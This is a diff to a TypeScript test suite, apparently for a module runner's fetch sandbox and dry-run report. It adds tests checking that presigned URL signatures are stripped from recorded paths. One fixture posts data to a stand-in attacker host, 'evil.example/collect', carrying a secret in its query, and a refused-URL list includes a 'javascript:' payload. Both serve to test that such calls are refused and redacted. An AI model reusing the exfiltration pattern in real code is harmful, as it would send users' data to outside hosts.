@@ -162,13 +162,25 @@ const FIXTURES: Record<string, string> = {
     "  }",
     "};",
   ].join("\n"),
-  // Two writes to one path on two declared hosts (Greptile on #156): the report must tell them apart.
+  // Two writes to one path on two declared hosts (Greptile on #156): the report must tell them apart,
+  // and each carries a query the report must not.
   "dryTwoHosts.mjs": [
     "export default async (_input, ctx) => {",
     '  const init = { method: "POST", headers: { "content-type": "text/plain" }, body: "same" };',
-    '  const first = await ctx.fetch("https://files.example.com/upload", init);',
-    '  const second = await ctx.fetch("https://other.example.com/upload", init);',
+    '  const first = await ctx.fetch("https://files.example.com/upload?sig=first-secret", init);',
+    '  const second = await ctx.fetch("https://other.example.com/upload?sig=second-secret", init);',
     "  return { first: first.status, second: second.status };",
+    "};",
+  ].join("\n"),
+  // A presigned pair (Greptile on #156): the signature rides in the query of a read and of a write.
+  "dryPresigned.mjs": [
+    "export default async (_input, ctx) => {",
+    '  const read = await ctx.fetch("https://files.example.com/report.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Signature=deadbeefcafe0123");',
+    '  const write = await ctx.fetch("https://uploads.example.com/put/object?X-Amz-Signature=feedface9876&X-Amz-Expires=300", {',
+    '    method: "PUT",',
+    '    body: "the bytes",',
+    "  });",
+    "  return { read: read.status, write: write.status };",
     "};",
   ].join("\n"),
   // The Slack shape (GRA-197): a read on a second host answers the URL the write goes to.
@@ -260,7 +272,7 @@ const FIXTURES: Record<string, string> = {
   "dryWriteRefused.mjs": [
     "export default async (_input, ctx) => {",
     "  try {",
-    '    await ctx.fetch("http://evil.example/collect", { method: "POST", body: "x" });',
+    '    await ctx.fetch("http://evil.example/collect?X-Amz-Signature=secret123", { method: "POST", body: "x" });',
     "  } catch (error) {",
     '    const res = await ctx.fetch("/orders", { method: "DELETE" });',
     "    return { caught: error.message, status: res.status };",
@@ -943,6 +955,19 @@ describe("ctx.fetch", () => {
     expect(received).toHaveLength(before);
   });
 
+  /** The sentence names the target less its query, so a signature in it is repeated nowhere (Greptile on #156). */
+  it("names a refused URL without its query", async () => {
+    const run = await runRunner({
+      module: fixture("escapes.mjs"),
+      stdin: JSON.stringify({ path: "http://evil.example/collect?X-Amz-Signature=secret123" }),
+      env: bound(),
+    });
+
+    const result = resultOf(run) as { refused: string };
+    expect(result.refused).toContain("not http:// (http://evil.example/collect?…).");
+    expect(result.refused).not.toContain("secret123");
+  });
+
   it.each(["ftp://files.example.com/x", "mailto:a@b.example", "javascript:alert(1)"])(
     "refuses %s as not https",
     async (url) => {
@@ -1304,19 +1329,25 @@ describe("GRAFT_DRY_RUN", () => {
     expect(result.writesRefused).toEqual([
       {
         method: "POST",
-        path: "http://evil.example/collect",
+        // The query dropped and marked, so the signature it carried is on no record (Greptile on #156).
+        path: "http://evil.example/collect?…",
         status: null,
-        error: expect.stringContaining("takes an https:// URL"),
+        error: expect.stringContaining("not http:// (http://evil.example/collect?…)"),
       },
       { method: "DELETE", path: "/orders", status: 403, error: null },
     ]);
+    expect(JSON.stringify(result)).not.toContain("secret123");
     expect(result.writesPreviewed).toEqual([]);
     expect(result.verified).toEqual({ reads: true, writeRequests: false });
     expect(result.unverified).toEqual([]);
   });
 
-  /** GRA-197: a call on the host route is on the report by the URL the module gave, so the host is named. */
-  it("records a read and a previewed write on an absolute URL by that URL, naming the host", async () => {
+  /**
+   * GRA-197: a call on the host route is on the report as scheme, host and path, so the host is
+   * named, with the query dropped and marked `?…` so a signature it carried is not (Greptile on
+   * #156, twice).
+   */
+  it("records a read and a previewed write on an absolute URL by scheme, host and path, the query marked and dropped", async () => {
     const before = received.length;
     const run = await runRunner({ module: fixture("dryAbsolute.mjs"), env: dry() });
 
@@ -1328,15 +1359,17 @@ describe("GRAFT_DRY_RUN", () => {
     expect(result.writesPreviewed).toEqual([
       {
         method: "POST",
-        // The URL the module gave, not the preview's vendor path, so the host is on the record as
-        // it is for the read above (Greptile on #156).
-        path: "https://files.example.com/upload/v1/abc?x=1",
+        // The URL the module gave less its query, not the preview's vendor path, so the host is on
+        // the record as it is for the read above and the query's values are not (Greptile on #156).
+        path: "https://files.example.com/upload/v1/abc?…",
         headerNames: expect.arrayContaining(["content-type"]),
         body: "the bytes",
       },
     ]);
     expect(result.writesRefused).toEqual([]);
     expect(result.moduleResult).toEqual({ read: 200, write: 202 });
+    expect(JSON.stringify(result)).not.toContain("x=1");
+    // The request itself carries the query whole: the record is what is trimmed, never the call.
     expect(received.slice(before).map((r) => r.url)).toEqual([
       "/c/conn_1/h/files.example.com/upload-url",
       "/c/conn_1/h/files.example.com/upload/v1/abc?x=1",
@@ -1344,7 +1377,8 @@ describe("GRAFT_DRY_RUN", () => {
   });
 
   /** Two writes to one path on two declared hosts are two entries, and the shape is the report's four fields. */
-  it("keeps two previewed writes to the same path on two hosts apart, each by its own URL", async () => {
+  it("keeps two previewed writes to the same path on two hosts apart, each by its own host, with both queries dropped", async () => {
+    const before = received.length;
     const run = await runRunner({ module: fixture("dryTwoHosts.mjs"), env: dry() });
 
     const result = report(run);
@@ -1353,13 +1387,13 @@ describe("GRAFT_DRY_RUN", () => {
     expect(result.writesPreviewed).toEqual([
       {
         method: "POST",
-        path: "https://files.example.com/upload",
+        path: "https://files.example.com/upload?…",
         headerNames: expect.arrayContaining(["content-type"]),
         body: "same",
       },
       {
         method: "POST",
-        path: "https://other.example.com/upload",
+        path: "https://other.example.com/upload?…",
         headerNames: expect.arrayContaining(["content-type"]),
         body: "same",
       },
@@ -1368,6 +1402,35 @@ describe("GRAFT_DRY_RUN", () => {
       expect(Object.keys(entry).sort()).toEqual(["body", "headerNames", "method", "path"]);
     }
     expect(new Set(result.writesPreviewed.map((entry) => entry.path)).size).toBe(2);
+    expect(JSON.stringify(result)).not.toContain("secret");
+    expect(received.slice(before).map((r) => r.url)).toEqual([
+      "/c/conn_1/h/files.example.com/upload?sig=first-secret",
+      "/c/conn_1/h/other.example.com/upload?sig=second-secret",
+    ]);
+  });
+
+  /** A presigned URL's signature is in its query, and the report carries none of it, on a read or a write. */
+  it("records a presigned read and write without the X-Amz-Signature their queries carried", async () => {
+    const run = await runRunner({ module: fixture("dryPresigned.mjs"), env: dry() });
+
+    const result = report(run);
+    expect(result.passed).toBe(true);
+    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
+    expect(result.reads).toEqual([
+      { method: "GET", path: "https://files.example.com/report.pdf?…", status: 200 },
+    ]);
+    expect(result.writesPreviewed).toEqual([
+      {
+        method: "PUT",
+        path: "https://uploads.example.com/put/object?…",
+        headerNames: expect.any(Array),
+        body: "the bytes",
+      },
+    ]);
+    const text = JSON.stringify(result);
+    for (const secret of ["deadbeefcafe0123", "feedface9876", "X-Amz", "AWS4-HMAC-SHA256"]) {
+      expect(text).not.toContain(secret);
+    }
   });
 
   it("writes the report to the result file on the detached path", async () => {
